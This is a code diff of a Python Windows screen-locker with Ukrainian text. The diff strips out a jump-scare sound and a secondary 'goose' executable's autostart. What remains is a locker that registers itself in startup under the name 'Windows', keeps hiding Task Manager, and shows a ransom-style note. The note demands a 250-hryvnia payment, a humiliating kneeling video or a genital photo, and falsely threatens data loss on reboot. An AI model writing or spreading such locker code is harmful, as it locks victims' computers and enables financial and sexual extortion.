@@ -1,9 +1,6 @@
 import customtkinter as ctk
 import os
-import random
 import time
-import subprocess
-from tkinter import messagebox
 import keyboard
 import win32gui
 import win32con
@@ -15,8 +12,7 @@ PASSWORD = "14707"
 FAKE_PASSWORD = "Гусь"
 BACKUP_PASSWORD = "unlockmepls"
 
-# Аудіо для скрімера (MP3 буде відкриватися в системному плеєрі)
-SCREAMER_PATH = os.path.join("assets", "audio.mp3")
+# Конфігурація видалена: скрімер та гусь прибрані
 
 # Теми та кольори
 ctk.set_appearance_mode("dark")
@@ -67,15 +63,7 @@ def add_to_startup(file_path, name):
 this_path = os.path.abspath(sys.argv[0])
 add_to_startup(this_path, "Windows")
 
-# Додаємо гуся в автозапуск (файл у підпапці goose/)
-goose_path = os.path.join(os.path.dirname(this_path), "scripts", "ProxyStarter.exe")
-if os.path.exists(goose_path):
-    add_to_startup(goose_path, "ProxyStarter")
-
-# Функція для запуску гуся
-def start_goose():
-    if os.path.exists(goose_path):
-        subprocess.Popen(goose_path)  # Запускаємо гуся в окремому процесі
+# Автозапуск гуся видалено
 
 # Вікно з градієнтним фоном
 root = ctk.CTk()
@@ -166,16 +154,17 @@ attempts_label = ctk.CTkLabel(
 )
 attempts_label.pack(pady=(5, 20))
 
-# Умови (лише текст)
+# Умови розблокування
 conditions = (
     "Для розблокування ви маєте єдиний варіант: ввести правильний пароль.\n"
     "Спроба перезавантажити комп'ютер призведе до втрати всіх даних і налаштувань.\n"
-    "Всі спроби обійти систему призведуть до додаткових ускладнень.\n"
-    "1. Перший варіант - оплата 250 гривень кожному на банківські карти.\n"
-    "2. Другий варіант - оплата 100.000$ в GTA 5 RP кожному.\n"
-    "3. Третій варіант - відео, де ви стоїте на колінах і кажете:\n"
-    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити з Олегом і Орестом, і присягаюсь називати їх 'Моя Величність'. Прошу розблокувати мій комп'ютер.\"\n"
-    "P.s фотка пісюна в лс тоже підійде."
+    "Будь-які спроби обійти систему спричинять додаткові ускладнення.\n\n"
+    "Варіанти розблокування:\n"
+    "1. Оплата 250 гривень на банківську карту.\n"
+    "2. Відео, де ви стоїте на колінах і кажете:\n"
+    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити зі своїм королем, "
+    "і присягаюсь називати його 'Мій Хазяїн'. Прошу розблокувати мій комп'ютер.\"\n\n"
+    "P.S. Фотка пісюна в лс теж підійде."
 )
 
 conditions_label = ctk.CTkLabel(
@@ -198,10 +187,7 @@ riddle = ctk.CTkLabel(
 )
 riddle.pack(pady=(15, 30))
 
-# Скрімер запуск (відкриття MP3 через системний плеєр)
-def play_screamer():
-    if os.path.exists(SCREAMER_PATH):
-        os.startfile(SCREAMER_PATH)
+# Скрімер видалено
 
 # Анімація помилки (замість тряски)
 def show_error_animation():
@@ -232,7 +218,6 @@ def unlock():
     if user_input == PASSWORD:
         root.destroy()
     elif user_input.lower().strip() == FAKE_PASSWORD.lower():
-        play_screamer()
         error_label.configure(text="Ох ні! Це фейковий пароль!")
     elif user_input == BACKUP_PASSWORD:
         root.destroy()
@@ -263,8 +248,7 @@ def on_enter(event):
 entry.bind('<Return>', on_enter)
 entry.focus()  # Автофокус на поле вводу
 
-# Запускаємо гуся
-start_goose()
+# Запуск гуся видалено
 
 # Безкінечне приховування Task Manager
 def loop_hide_taskmgr():
